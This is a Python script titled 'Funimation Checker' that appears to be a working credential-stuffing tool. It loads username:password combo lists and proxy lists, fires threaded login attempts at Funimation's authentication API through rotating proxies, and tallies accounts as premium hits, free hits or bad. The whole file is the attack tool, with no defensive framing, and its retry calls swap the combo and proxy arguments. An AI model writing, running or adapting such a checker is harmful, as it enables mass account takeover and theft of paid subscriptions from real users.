import threading, requests, ctypes, os
from colorama import Fore, Style

name = "Funimation Checker"

os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW(f"{name} ") 

proxies = []
combos = []

w = Fore.WHITE
l = Fore.LIGHTBLUE_EX
rs = Style.RESET_ALL

class MAIN:
    def __init__(self):
        # req
        self.checking = True
        self.proxy_counter = 0
        self.counter = 0
        self.lock = threading.Lock()
        self.session = requests.Session()
        # var
        self.Valids = 0
        self.Bad = 0
        self.Checked = 0
        self.Retries = 0
        self.Free = 0

    def safeprint(self, arg):
        self.lock.acquire()
        print(arg)
        self.lock.release()

    def loadproxies(self): 
        if os.path.exists("proxies.txt"):
            with open ("proxies.txt","r",encoding="UTF-8") as f:
                for line in f.readlines():
                    line = line.replace("\n", "")
                    proxies.append(line)
                if len(proxies) == 0:
                    print(Fore.RED + f"\a\n\t\t{l}[!] {w}Proxies file is empty, please put in proxies.")
                    input(Fore.BLACK + "\t\t" + Fore.BLACK); quit()
        else:
            open ("proxies.txt", "x")
            print(Fore.RED + f"\a\n\t\t{l}[!] {w}Proxies file is empty, please put in proxies.")
            input(Fore.BLACK + "\t\t" + Fore.BLACK); quit()

    def loadcumbers(self): 
        if os.path.exists("combo.txt"):
            with open ("combo.txt","r",encoding="UTF-8") as f:
                for line in f.readlines():
                    line = line.replace("\n", "")
                    combos.append(line)
                if len(combos) == 0:
                    print(Fore.RED + f"\a\n\t\t{l}[!] {w}Combo file is empty, please put in lines.")
                    input(); quit()
        else:
            open ("combo.txt", "x")
            print(Fore.RED + f"\a\n\t\t{l}[!] {w}Combo file is empty, please put lines in.")
            input(), quit()

    def Threads(self):
        try:
            threads = int(input(f'\n\t\t{w}> {l}Threads: {rs}'))
            os.system('cls')
            self.safeprint(ape)
            return threads
        except ValueError:
            self.Threads()

    def title(self): 
        ctypes.windll.kernel32.SetConsoleTitleW(f"{name} - Checked: {self.Checked} | Premium Hits: {self.Valids} | Free Hits: {self.Free} | Bad: {self.Bad} | Retries: {self.Retries}")

    def login(self,proxy,combo): 
        self.title()
        try:
            url = "https://prod-api-funimationnow.dadcdigital.com/api/auth/login/"
            u = combo.split(":")[0] 
            p = combo.split(":")[1] 
            proxiess = { 
            "http": f"http://{proxy}", 
            "https": f"http://{proxy}", 
            "ftp": f"ftp://{proxy}"}
            headers = { 
                "Content-Type": "application/json"
            }
            data = { 
                "username": u,
                "password": p
            }
            r = self.session.post(url,headers=headers,data=data,proxies=proxiess)
            if 'success":false' in r.text:
                self.Bad += 1
                self.Checked += 1
            elif 'premium' in r.text:
                self.Valids += 1
                self.Checked += 1
            elif 'free' in r.text:
                self.Free += 1
                self.Checked += 1
            elif 'robots' in r.text:
                self.Retries += 1
                self.login(combo, proxy)
            self.title()
        except: 
            self.Retries += 1
            self.login(combo, proxy)
            self.title()
            pass

    def start(self):
        self.loadcumbers()
        self.loadproxies()
        threads = self.Threads()
        
        def thread_starter():
            self.login(proxies[self.proxy_counter], combos[self.counter])

        while self.checking:
            try:
                if threading.active_count() <= threads:
                    threading.Thread(target = thread_starter).start()
                    self.proxy_counter += 1
                    self.counter += 1
                if len(proxies) <= self.proxy_counter:
                    self.proxy_counter = 0
                if len(combos) <= self.counter:
                    self.checking = False
            except:
                pass

ape = (Fore.LIGHTBLUE_EX + f"""
\t\t███████╗██╗   ██╗███╗   ██╗██╗███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
\t\t██╔════╝██║   ██║████╗  ██║██║████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
\t\t█████╗  ██║   ██║██╔██╗ ██║██║██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
\t\t██╔══╝  ██║   ██║██║╚██╗██║██║██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
\t\t██║     ╚██████╔╝██║ ╚████║██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
\t\t╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═══{w}github.com/59n{l}
\t\t\t\t ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
\t\t\t\t██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
\t\t\t\t██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
\t\t\t\t██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
\t\t\t\t╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
\t\t\t\t ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                        
""")   

print(ape) 
obj = MAIN()
obj.start()
input()
